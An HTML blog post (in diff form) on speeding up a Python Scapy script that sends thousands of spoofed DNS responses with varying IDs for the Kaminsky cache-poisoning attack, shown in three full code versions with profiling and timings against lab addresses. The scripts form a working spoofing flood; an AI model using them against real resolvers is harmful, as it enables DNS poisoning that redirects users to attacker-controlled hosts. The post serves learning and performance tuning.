@@ -1,0 +1,198 @@
+<!doctype html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta http-equiv="x-ua-compatible" content="ie=edge">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <title>Woefe's Blog
+            
+                - Speeding up Scapy
+            
+        </title>
+        <link rel="icon" type="image/png" href="../images/favicon.png">
+        <link rel="stylesheet" href="../css/default.css" />
+        <link rel="stylesheet" href="../css/syntax.css" />
+    </head>
+    <body>
+        <header>
+            <div class="logo">
+                <a href="../">Woefe's Blog</a>
+            </div>
+        </header>
+
+        <main>
+            <article class="post">
+    <h1 class="post_title">Speeding up Scapy</h1>
+    <section class="post_header">
+        Posted on March 22, 2019
+        
+    </section>
+    <section>
+        <p>A few weeks ago I revisited the DNS cache poisoning attack discovered by Dan Kaminsky in 2008.
+Implementing the attack requires some fairly low-level manipulation of DNS packets.
+Fortunately, we have <a href="https://scapy.net/">Scapy</a>, which makes packet manipulation easy and accessible from Python.
+But at first the performance of my script was so bad that I could not carry out the attack (maybe I just never waited long enough).
+In this post I want to record my journey that led to a faster and faster Scapy script.</p>
+<!--more-->
+<p>A deep understanding of the Kaminsky attack won’t be necessary for this blog post.
+Nevertheless, if you want to learn more about the attack, I can recommend the paper from <a href="http://unixwiz.net/techtips/iguide-kaminsky-dns-vuln.html">unixwiz.net</a>, which helped me a lot in understanding the issue.
+For this post you only have to understand the following detail of the attack: we want to send a lot of spoofed DNS responses with varying DNS IDs.
+The more packets we send per second the higher our chance to succeed.</p>
+<h1 id="first-attempt">First attempt</h1>
+<p>Below you can find a simplified excerpt from my initial attack script.
+Packets are composed by gluing together the different layers with the <code>/</code> operator.
+For example, the DNS response over UDP follows the <code>IP()/UDP()/DNS()</code> structure.
+For now, you can safely ignore the parameters like source, destination or the particular DNS answer record.
+What is actually important is the for-loop, which sends 5000 packets using Scapy’s <code>send()</code> function.</p>
+<div class="sourceCode" id="cb1"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="im">from</span> scapy.<span class="bu">all</span> <span class="im">import</span> <span class="op">*</span></span>
+<span id="cb1-2"><a href="#cb1-2" aria-hidden="true" tabindex="-1"></a><span class="im">import</span> random</span>
+<span id="cb1-3"><a href="#cb1-3" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb1-4"><a href="#cb1-4" aria-hidden="true" tabindex="-1"></a>n_packets <span class="op">=</span> <span class="dv">5000</span></span>
+<span id="cb1-5"><a href="#cb1-5" aria-hidden="true" tabindex="-1"></a>start_time <span class="op">=</span> time.time()</span>
+<span id="cb1-6"><a href="#cb1-6" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb1-7"><a href="#cb1-7" aria-hidden="true" tabindex="-1"></a><span class="cf">for</span> i <span class="kw">in</span> <span class="bu">range</span>(n_packets):</span>
+<span id="cb1-8"><a href="#cb1-8" aria-hidden="true" tabindex="-1"></a>    response <span class="op">=</span> (</span>
+<span id="cb1-9"><a href="#cb1-9" aria-hidden="true" tabindex="-1"></a>        IP(dst<span class="op">=</span><span class="st">&quot;192.168.178.1&quot;</span>, src<span class="op">=</span><span class="st">&quot;192.168.178.2&quot;</span>)</span>
+<span id="cb1-10"><a href="#cb1-10" aria-hidden="true" tabindex="-1"></a>        <span class="op">/</span> UDP(sport<span class="op">=</span><span class="dv">53</span>, dport<span class="op">=</span><span class="dv">4444</span>)</span>
+<span id="cb1-11"><a href="#cb1-11" aria-hidden="true" tabindex="-1"></a>        <span class="op">/</span> DNS(</span>
+<span id="cb1-12"><a href="#cb1-12" aria-hidden="true" tabindex="-1"></a>            <span class="bu">id</span><span class="op">=</span>(<span class="dv">1024</span> <span class="op">+</span> i) <span class="op">%</span> <span class="dv">65535</span>,</span>
+<span id="cb1-13"><a href="#cb1-13" aria-hidden="true" tabindex="-1"></a>            an<span class="op">=</span>DNSRR(rrname<span class="op">=</span><span class="st">&quot;dummy.example.kom&quot;</span>, ttl<span class="op">=</span><span class="dv">70000</span>, rdata<span class="op">=</span><span class="st">&quot;192.168.178.3&quot;</span>),</span>
+<span id="cb1-14"><a href="#cb1-14" aria-hidden="true" tabindex="-1"></a>        )</span>
+<span id="cb1-15"><a href="#cb1-15" aria-hidden="true" tabindex="-1"></a>    )</span>
+<span id="cb1-16"><a href="#cb1-16" aria-hidden="true" tabindex="-1"></a>    send(response)</span>
+<span id="cb1-17"><a href="#cb1-17" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb1-18"><a href="#cb1-18" aria-hidden="true" tabindex="-1"></a>end_time <span class="op">=</span> time.time()</span>
+<span id="cb1-19"><a href="#cb1-19" aria-hidden="true" tabindex="-1"></a><span class="bu">print</span>(<span class="ss">f&quot;sent </span><span class="sc">{</span>n_packets<span class="sc">}</span><span class="ss"> responses in </span><span class="sc">{</span>end_time <span class="op">-</span> start_time<span class="sc">:.3f}</span><span class="ss"> seconds&quot;</span>)</span></code></pre></div>
+<p>This script is quite slow.
+It took over four minutes to send the 5000 packets.</p>
+<pre><code>&gt; sudo python3 01_naive.py
+...
+sent 5000 responses in 265.825 seconds</code></pre>
+<p>To find the bottleneck that is wrecking performance I profiled the script with the <code>cProfile</code> module.</p>
+<div class="sourceCode" id="cb3"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Note that the amount of packets was reduced to 100!</span></span>
+<span id="cb3-2"><a href="#cb3-2" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> python <span class="at">-m</span> cProfile <span class="at">-s</span> time 01_naive.py</span>
+<span id="cb3-3"><a href="#cb3-3" aria-hidden="true" tabindex="-1"></a><span class="ex">...</span></span>
+<span id="cb3-4"><a href="#cb3-4" aria-hidden="true" tabindex="-1"></a><span class="ex">ncalls</span>  tottime  percall  cumtime  percall filename:lineno<span class="er">(</span><span class="kw">function)</span></span>
+<span id="cb3-5"><a href="#cb3-5" aria-hidden="true" tabindex="-1"></a>   <span class="ex">404</span>    2.502    0.006    2.502    0.006 {function socket.close at 0x7ff8449c19d8}</span>
+<span id="cb3-6"><a href="#cb3-6" aria-hidden="true" tabindex="-1"></a>   <span class="ex">201</span>    2.352    0.012    2.352    0.012 {method <span class="st">'bind'</span> of <span class="st">'_socket.socket'</span> objects}</span></code></pre></div>
+<p>Most of the time is spent opening and closing sockets.
+It turns out <code>send()</code> opens a new socket for every single packet.</p>
+<h1 id="second-attempt-using-a-socket">Second attempt: using a socket</h1>
+<p>To fix the performance problems discovered above, we must tell Scapy to use the same socket for all responses.
+Scapy supports two kinds of sockets.
+One at OSI Layer 2, the <code>L2Socket</code>, which accepts <code>Ether()/...</code> or <code>bytes</code> objects and the other at Layer 3, named <code>L3Socket</code>, which accepts <code>IP()/...</code> objects.
+The patch is quite simple: create an <code>L3socket</code> and replace <code>send()</code> with <code>L3Socket.send()</code>.</p>
+<div class="sourceCode" id="cb4"><pre class="sourceCode diff"><code class="sourceCode diff"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="dt">4a5</span></span>
+<span id="cb4-2"><a href="#cb4-2" aria-hidden="true" tabindex="-1"></a><span class="va">&gt; s = conf.L3socket()</span></span>
+<span id="cb4-3"><a href="#cb4-3" aria-hidden="true" tabindex="-1"></a><span class="dt">16c17</span></span>
+<span id="cb4-4"><a href="#cb4-4" aria-hidden="true" tabindex="-1"></a><span class="st">&lt;     send(response)</span></span>
+<span id="cb4-5"><a href="#cb4-5" aria-hidden="true" tabindex="-1"></a><span class="kw">---</span></span>
+<span id="cb4-6"><a href="#cb4-6" aria-hidden="true" tabindex="-1"></a><span class="va">&gt;     s.send(response)</span></span></code></pre></div>
+<p>When we execute the script, we can see that the performance increased by a factor of roughly 56.</p>
+<pre><code>&gt; sudo python3 02_with_socket.py
+sent 5000 responses in 4.743 seconds</code></pre>
+<p>We can further improve the script by roughly 1.5 seconds by preparing the response beforehand and only adjusting the ID within the loop:</p>
+<div class="sourceCode" id="cb6"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true" tabindex="-1"></a><span class="im">from</span> scapy.<span class="bu">all</span> <span class="im">import</span> <span class="op">*</span></span>
+<span id="cb6-2"><a href="#cb6-2" aria-hidden="true" tabindex="-1"></a><span class="im">import</span> random</span>
+<span id="cb6-3"><a href="#cb6-3" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb6-4"><a href="#cb6-4" aria-hidden="true" tabindex="-1"></a>n_packets <span class="op">=</span> <span class="dv">5000</span></span>
+<span id="cb6-5"><a href="#cb6-5" aria-hidden="true" tabindex="-1"></a>response <span class="op">=</span> (</span>
+<span id="cb6-6"><a href="#cb6-6" aria-hidden="true" tabindex="-1"></a>    IP(dst<span class="op">=</span><span class="st">&quot;192.168.178.1&quot;</span>, src<span class="op">=</span><span class="st">&quot;192.168.178.2&quot;</span>)</span>
+<span id="cb6-7"><a href="#cb6-7" aria-hidden="true" tabindex="-1"></a>    <span class="op">/</span> UDP(sport<span class="op">=</span><span class="dv">53</span>, dport<span class="op">=</span><span class="dv">4444</span>)</span>
+<span id="cb6-8"><a href="#cb6-8" aria-hidden="true" tabindex="-1"></a>    <span class="op">/</span> DNS(<span class="bu">id</span><span class="op">=</span><span class="dv">0</span>, an<span class="op">=</span>DNSRR(rrname<span class="op">=</span><span class="st">&quot;dummy.example.kom&quot;</span>, ttl<span class="op">=</span><span class="dv">70000</span>, rdata<span class="op">=</span><span class="st">&quot;192.168.178.3&quot;</span>))</span>
+<span id="cb6-9"><a href="#cb6-9" aria-hidden="true" tabindex="-1"></a>)</span>
+<span id="cb6-10"><a href="#cb6-10" aria-hidden="true" tabindex="-1"></a>dns_layer <span class="op">=</span> response[DNS]</span>
+<span id="cb6-11"><a href="#cb6-11" aria-hidden="true" tabindex="-1"></a>s <span class="op">=</span> conf.L3socket()</span>
+<span id="cb6-12"><a href="#cb6-12" aria-hidden="true" tabindex="-1"></a>start_time <span class="op">=</span> time.time()</span>
+<span id="cb6-13"><a href="#cb6-13" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb6-14"><a href="#cb6-14" aria-hidden="true" tabindex="-1"></a><span class="cf">for</span> i <span class="kw">in</span> <span class="bu">range</span>(n_packets):</span>
+<span id="cb6-15"><a href="#cb6-15" aria-hidden="true" tabindex="-1"></a>    dns_layer.<span class="bu">id</span> <span class="op">=</span> (<span class="dv">1024</span> <span class="op">+</span> i) <span class="op">%</span> <span class="dv">65535</span></span>
+<span id="cb6-16"><a href="#cb6-16" aria-hidden="true" tabindex="-1"></a>    s.send(response)</span>
+<span id="cb6-17"><a href="#cb6-17" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb6-18"><a href="#cb6-18" aria-hidden="true" tabindex="-1"></a>end_time <span class="op">=</span> time.time()</span>
+<span id="cb6-19"><a href="#cb6-19" aria-hidden="true" tabindex="-1"></a><span class="bu">print</span>(<span class="ss">f&quot;sent </span><span class="sc">{</span>n_packets<span class="sc">}</span><span class="ss"> responses in </span><span class="sc">{</span>end_time <span class="op">-</span> start_time<span class="sc">:.3f}</span><span class="ss"> seconds&quot;</span>)</span></code></pre></div>
+<h1 id="third-attempt-pre-render-response">Third attempt: pre-render response</h1>
+<p>The patch from above yielded in noticeably better performance, but can we do better?
+After another round of profiling the answer is: yes, but we have to fiddle with our responses on byte-level.
+It turns out that most of the time is spent encoding the Scapy objects to byte arrays which are suitable to transmit over the wire.
+Every time we send a packet, Scapy implicitly calls the <code>raw()</code> function to encode the object representing our DNS response to bytes.
+If we could do this only once before the loop, we would win even more performance.
+Recall that we have to adjust the DNS ID on every single packet.
+Therefore, preparing a static response using the <code>raw()</code> method will not be sufficient.
+My solution is to prepare the response before entering the loop and then to manually adjust the DNS ID and UDP checksum within the encoded byte array.</p>
+<div class="sourceCode" id="cb7"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a><span class="im">from</span> scapy.<span class="bu">all</span> <span class="im">import</span> <span class="op">*</span></span>
+<span id="cb7-2"><a href="#cb7-2" aria-hidden="true" tabindex="-1"></a><span class="im">import</span> random</span>
+<span id="cb7-3"><a href="#cb7-3" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb7-4"><a href="#cb7-4" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb7-5"><a href="#cb7-5" aria-hidden="true" tabindex="-1"></a><span class="kw">def</span> patch(dns_frame: <span class="bu">bytearray</span>, pseudo_hdr: <span class="bu">bytes</span>, dns_id: <span class="bu">int</span>):</span>
+<span id="cb7-6"><a href="#cb7-6" aria-hidden="true" tabindex="-1"></a>    <span class="co">&quot;&quot;&quot;Adjust the DNS id and patch the UDP checksum within the given Ethernet frame&quot;&quot;&quot;</span></span>
+<span id="cb7-7"><a href="#cb7-7" aria-hidden="true" tabindex="-1"></a>    <span class="co"># set dns id</span></span>
+<span id="cb7-8"><a href="#cb7-8" aria-hidden="true" tabindex="-1"></a>    <span class="co"># the byte offsets can be found in Wireshark</span></span>
+<span id="cb7-9"><a href="#cb7-9" aria-hidden="true" tabindex="-1"></a>    dns_frame[<span class="dv">42</span>] <span class="op">=</span> (dns_id <span class="op">&gt;&gt;</span> <span class="dv">8</span>) <span class="op">&amp;</span> <span class="bn">0xFF</span></span>
+<span id="cb7-10"><a href="#cb7-10" aria-hidden="true" tabindex="-1"></a>    dns_frame[<span class="dv">43</span>] <span class="op">=</span> dns_id <span class="op">&amp;</span> <span class="bn">0xFF</span></span>
+<span id="cb7-11"><a href="#cb7-11" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb7-12"><a href="#cb7-12" aria-hidden="true" tabindex="-1"></a>    <span class="co"># reset checksum</span></span>
+<span id="cb7-13"><a href="#cb7-13" aria-hidden="true" tabindex="-1"></a>    dns_frame[<span class="dv">40</span>] <span class="op">=</span> <span class="bn">0x00</span></span>
+<span id="cb7-14"><a href="#cb7-14" aria-hidden="true" tabindex="-1"></a>    dns_frame[<span class="dv">41</span>] <span class="op">=</span> <span class="bn">0x00</span></span>
+<span id="cb7-15"><a href="#cb7-15" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb7-16"><a href="#cb7-16" aria-hidden="true" tabindex="-1"></a>    <span class="co"># calc new checksum</span></span>
+<span id="cb7-17"><a href="#cb7-17" aria-hidden="true" tabindex="-1"></a>    ck <span class="op">=</span> checksum(pseudo_hdr <span class="op">+</span> dns_frame[<span class="dv">34</span>:])</span>
+<span id="cb7-18"><a href="#cb7-18" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> ck <span class="op">==</span> <span class="dv">0</span>:</span>
+<span id="cb7-19"><a href="#cb7-19" aria-hidden="true" tabindex="-1"></a>        ck <span class="op">=</span> <span class="bn">0xFFFF</span></span>
+<span id="cb7-20"><a href="#cb7-20" aria-hidden="true" tabindex="-1"></a>    cs <span class="op">=</span> struct.pack(<span class="st">&quot;!H&quot;</span>, ck)</span>
+<span id="cb7-21"><a href="#cb7-21" aria-hidden="true" tabindex="-1"></a>    dns_frame[<span class="dv">40</span>] <span class="op">=</span> cs[<span class="dv">0</span>]</span>
+<span id="cb7-22"><a href="#cb7-22" aria-hidden="true" tabindex="-1"></a>    dns_frame[<span class="dv">41</span>] <span class="op">=</span> cs[<span class="dv">1</span>]</span>
+<span id="cb7-23"><a href="#cb7-23" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb7-24"><a href="#cb7-24" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb7-25"><a href="#cb7-25" aria-hidden="true" tabindex="-1"></a>n_packets <span class="op">=</span> <span class="dv">5000</span></span>
+<span id="cb7-26"><a href="#cb7-26" aria-hidden="true" tabindex="-1"></a>response <span class="op">=</span> (</span>
+<span id="cb7-27"><a href="#cb7-27" aria-hidden="true" tabindex="-1"></a>    Ether()</span>
+<span id="cb7-28"><a href="#cb7-28" aria-hidden="true" tabindex="-1"></a>    <span class="op">/</span> IP(dst<span class="op">=</span><span class="st">&quot;192.168.178.1&quot;</span>, src<span class="op">=</span><span class="st">&quot;192.168.178.2&quot;</span>)</span>
+<span id="cb7-29"><a href="#cb7-29" aria-hidden="true" tabindex="-1"></a>    <span class="op">/</span> UDP(sport<span class="op">=</span><span class="dv">53</span>, dport<span class="op">=</span><span class="dv">4444</span>)</span>
+<span id="cb7-30"><a href="#cb7-30" aria-hidden="true" tabindex="-1"></a>    <span class="op">/</span> DNS(<span class="bu">id</span><span class="op">=</span><span class="dv">0</span>, an<span class="op">=</span>DNSRR(rrname<span class="op">=</span><span class="st">&quot;dummy.example.kom&quot;</span>, ttl<span class="op">=</span><span class="dv">70000</span>, rdata<span class="op">=</span><span class="st">&quot;192.168.178.3&quot;</span>))</span>
+<span id="cb7-31"><a href="#cb7-31" aria-hidden="true" tabindex="-1"></a>)</span>
+<span id="cb7-32"><a href="#cb7-32" aria-hidden="true" tabindex="-1"></a>dns_frame <span class="op">=</span> <span class="bu">bytearray</span>(raw(response))</span>
+<span id="cb7-33"><a href="#cb7-33" aria-hidden="true" tabindex="-1"></a>pseudo_hdr <span class="op">=</span> struct.pack(</span>
+<span id="cb7-34"><a href="#cb7-34" aria-hidden="true" tabindex="-1"></a>    <span class="st">&quot;!4s4sHH&quot;</span>,</span>
+<span id="cb7-35"><a href="#cb7-35" aria-hidden="true" tabindex="-1"></a>    inet_pton(socket.AF_INET, response[<span class="st">&quot;IP&quot;</span>].src),</span>
+<span id="cb7-36"><a href="#cb7-36" aria-hidden="true" tabindex="-1"></a>    inet_pton(socket.AF_INET, response[<span class="st">&quot;IP&quot;</span>].dst),</span>
+<span id="cb7-37"><a href="#cb7-37" aria-hidden="true" tabindex="-1"></a>    socket.IPPROTO_UDP,</span>
+<span id="cb7-38"><a href="#cb7-38" aria-hidden="true" tabindex="-1"></a>    <span class="bu">len</span>(dns_frame[<span class="dv">34</span>:]),</span>
+<span id="cb7-39"><a href="#cb7-39" aria-hidden="true" tabindex="-1"></a>)</span>
+<span id="cb7-40"><a href="#cb7-40" aria-hidden="true" tabindex="-1"></a>s <span class="op">=</span> conf.L2socket()</span>
+<span id="cb7-41"><a href="#cb7-41" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb7-42"><a href="#cb7-42" aria-hidden="true" tabindex="-1"></a>start_time <span class="op">=</span> time.time()</span>
+<span id="cb7-43"><a href="#cb7-43" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb7-44"><a href="#cb7-44" aria-hidden="true" tabindex="-1"></a><span class="cf">for</span> i <span class="kw">in</span> <span class="bu">range</span>(n_packets):</span>
+<span id="cb7-45"><a href="#cb7-45" aria-hidden="true" tabindex="-1"></a>    patch(dns_frame, pseudo_hdr, (<span class="dv">1024</span> <span class="op">+</span> i) <span class="op">%</span> <span class="dv">65535</span>)</span>
+<span id="cb7-46"><a href="#cb7-46" aria-hidden="true" tabindex="-1"></a>    s.send(dns_frame)</span>
+<span id="cb7-47"><a href="#cb7-47" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb7-48"><a href="#cb7-48" aria-hidden="true" tabindex="-1"></a>end_time <span class="op">=</span> time.time()</span>
+<span id="cb7-49"><a href="#cb7-49" aria-hidden="true" tabindex="-1"></a><span class="bu">print</span>(<span class="ss">f&quot;sent </span><span class="sc">{</span>n_packets<span class="sc">}</span><span class="ss"> responses in </span><span class="sc">{</span>end_time <span class="op">-</span> start_time<span class="sc">:.3f}</span><span class="ss"> seconds&quot;</span>)</span></code></pre></div>
+<p>The performance critical part of the script is now 2000-3000 times faster than the initial version!</p>
+<pre><code>&gt; sudo python3 03_without_raw.py
+sent 5000 responses in 0.096 seconds</code></pre>
+    </section>
+</article>
+
+        </main>
+
+        <footer>
+    <nav>
+        <a href="../">Home</a>
+        ·
+        <a href="../about.html">About</a>
+        ·
+        <a href="../contact.html">Contact</a>
+        ·
+        <a href="../archive.html">Archive</a>
+        ·
+        <a href="../atom.xml">Feed</a>
+    </nav>
+    <hr>
+    Site proudly generated by
+    <a href="http://jaspervdj.be/hakyll">Hakyll</a>
+</footer>
+
+    </body>
+</html>
